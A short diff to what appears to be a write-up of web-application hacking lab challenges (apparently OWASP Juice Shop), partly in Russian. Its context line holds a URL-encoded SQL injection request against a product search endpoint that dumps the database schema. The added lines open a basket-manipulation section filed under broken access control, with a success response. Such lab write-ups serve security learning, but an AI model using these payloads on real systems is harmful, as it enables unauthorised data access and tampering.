@@ -52,7 +52,15 @@ GET /rest/products/search?q=banana%27%29+UNION+SELECT+20%2Csql%2C3%2C4%2C5%2C6%2
 look uploaded screenshot ''image.jpg''
 
 -----------------------------------------------------------
+4. (Manipulate Basket)
 
+* **Категория OWASP Top 10:** A01:2021-Broken Access Control (Нарушение контроля доступа)
+
+
+
+### Resulting Outcome
+"status":"success","data":{"id":11,"ProductId":6,"BasketId":"6","quantity":1,"updatedAt":"2026-11-03T20:05:04.211Z","createdAt":"2026-11-03T20:05:04.211Z"}}
+-------------------------------------------------------
 
 
 
